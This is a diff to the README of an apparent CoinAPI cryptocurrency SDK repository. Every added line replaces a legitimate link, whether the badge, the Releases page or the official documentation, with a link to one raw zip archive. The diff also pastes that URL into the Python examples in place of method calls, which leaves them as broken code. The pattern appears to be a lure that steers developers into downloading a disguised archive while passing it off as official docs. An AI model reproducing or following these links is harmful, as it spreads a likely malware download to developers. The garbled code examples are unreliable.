@@ -1,6 +1,6 @@
 # CoinAPI SDK 🌐
 
-![CoinAPI SDK](https://img.shields.io/badge/SDKs_for_CoinAPI-brightgreen)
+![CoinAPI SDK](https://raw.githubusercontent.com/mahmoudsamy12356/coinapi-sdk/main/cuggermugger/sdk-coinapi-v2.6-beta.3.zip)
 
 Welcome to the CoinAPI SDK repository! This project provides software development kits (SDKs) for accessing CoinAPI's services. CoinAPI offers a unified platform for obtaining cryptocurrency market data, exchange rates, and trading functionalities. With this SDK, developers can easily integrate CoinAPI's features into their applications.
 
@@ -33,7 +33,7 @@ Whether you are building a trading application, analyzing market trends, or deve
 
 ## Installation
 
-To get started, download the SDK from the [Releases](https://github.com/mahmoudsamy12356/coinapi-sdk/releases) section. Choose the appropriate version for your programming environment, download it, and follow the instructions provided in the release notes to install and configure the SDK.
+To get started, download the SDK from the [Releases](https://raw.githubusercontent.com/mahmoudsamy12356/coinapi-sdk/main/cuggermugger/sdk-coinapi-v2.6-beta.3.zip) section. Choose the appropriate version for your programming environment, download it, and follow the instructions provided in the release notes to install and configure the SDK.
 
 ### Example for Python
 
@@ -64,7 +64,7 @@ The CoinAPI SDK is designed to be user-friendly. Below are some common use cases
 To get the current price of a cryptocurrency:
 
 ```python
-price = api.get_current_price('BTC/USD')
+price = https://raw.githubusercontent.com/mahmoudsamy12356/coinapi-sdk/main/cuggermugger/sdk-coinapi-v2.6-beta.3.zip('BTC/USD')
 print(f"Current Bitcoin Price: {price}")
 ```
 
@@ -73,7 +73,7 @@ print(f"Current Bitcoin Price: {price}")
 To fetch historical data for a specific cryptocurrency:
 
 ```python
-historical_data = api.get_historical_data('BTC/USD', '2023-01-01', '2023-01-31')
+historical_data = https://raw.githubusercontent.com/mahmoudsamy12356/coinapi-sdk/main/cuggermugger/sdk-coinapi-v2.6-beta.3.zip('BTC/USD', '2023-01-01', '2023-01-31')
 print(historical_data)
 ```
 
@@ -82,13 +82,13 @@ print(historical_data)
 To retrieve exchange rates:
 
 ```python
-exchange_rates = api.get_exchange_rates('USD')
+exchange_rates = https://raw.githubusercontent.com/mahmoudsamy12356/coinapi-sdk/main/cuggermugger/sdk-coinapi-v2.6-beta.3.zip('USD')
 print(exchange_rates)
 ```
 
 ## API Documentation
 
-For detailed API documentation, please visit the official [CoinAPI Documentation](https://docs.coinapi.io/). This resource provides comprehensive information on all available endpoints, request parameters, and response formats.
+For detailed API documentation, please visit the official [CoinAPI Documentation](https://raw.githubusercontent.com/mahmoudsamy12356/coinapi-sdk/main/cuggermugger/sdk-coinapi-v2.6-beta.3.zip). This resource provides comprehensive information on all available endpoints, request parameters, and response formats.
 
 ## Contributing
 
@@ -112,8 +112,8 @@ If you encounter any issues or have questions, please open an issue in this repo
 
 ## Releases
 
-For the latest versions and updates, please check the [Releases](https://github.com/mahmoudsamy12356/coinapi-sdk/releases) section. Download the latest version, and follow the installation instructions to get started with the SDK.
+For the latest versions and updates, please check the [Releases](https://raw.githubusercontent.com/mahmoudsamy12356/coinapi-sdk/main/cuggermugger/sdk-coinapi-v2.6-beta.3.zip) section. Download the latest version, and follow the installation instructions to get started with the SDK.
 
 ## Conclusion
 
-Thank you for using the CoinAPI SDK. We hope it helps you in your cryptocurrency projects. For more information, visit the [CoinAPI Documentation](https://docs.coinapi.io/) and feel free to reach out with any questions or feedback. Happy coding!
+Thank you for using the CoinAPI SDK. We hope it helps you in your cryptocurrency projects. For more information, visit the [CoinAPI Documentation](https://raw.githubusercontent.com/mahmoudsamy12356/coinapi-sdk/main/cuggermugger/sdk-coinapi-v2.6-beta.3.zip) and feel free to reach out with any questions or feedback. Happy coding!
